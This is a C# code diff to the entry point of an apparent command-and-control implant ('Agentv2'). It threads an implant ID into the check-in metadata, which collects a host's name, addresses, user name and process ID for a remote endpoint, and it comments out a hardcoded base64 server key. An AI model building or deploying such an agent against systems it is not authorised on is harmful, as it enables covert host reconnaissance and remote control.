@@ -46,6 +46,7 @@ namespace EntryPoint
         {
             string connUrl = Agentv2.Properties.Resources.EndPoint;
             string serverKey = Agentv2.Properties.Resources.Key;
+            string implantId = Agentv2.Properties.Resources.Implant;
 #if DEBUG
             Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));
 
@@ -63,10 +64,10 @@ namespace EntryPoint
             {
                 serverKey = _args[1];
             }
-            else
-            {
-                serverKey = "MXlPZEVWWGVmN2xqbnpyUg==";
-            }
+            //else
+            //{
+            //    serverKey = "MXlPZEVWWGVmN2xqbnpyUg==";
+            //}
 
 
 
@@ -82,7 +83,7 @@ namespace EntryPoint
                 return;
             }
 
-            var metaData = GenerateMetadata(connexion.ToString());
+            var metaData = GenerateMetadata(connexion.ToString(), implantId);
 
 
             var configService = new ConfigService();
@@ -142,7 +143,7 @@ namespace EntryPoint
         }
 
 
-        static AgentMetadata GenerateMetadata(string endpoint)
+        static AgentMetadata GenerateMetadata(string endpoint, string implantId)
         {
             var hostname = Dns.GetHostName();
             var addresses = Dns.GetHostAddressesAsync(hostname).Result;
@@ -165,6 +166,7 @@ namespace EntryPoint
             AgentMetadata metadata = new AgentMetadata()
             {
                 Id = Agent.ShortGuid.NewGuid(),
+                ImplantId = implantId,
                 Hostname = hostname,
                 UserName = userName,
                 ProcessId = process.Id,
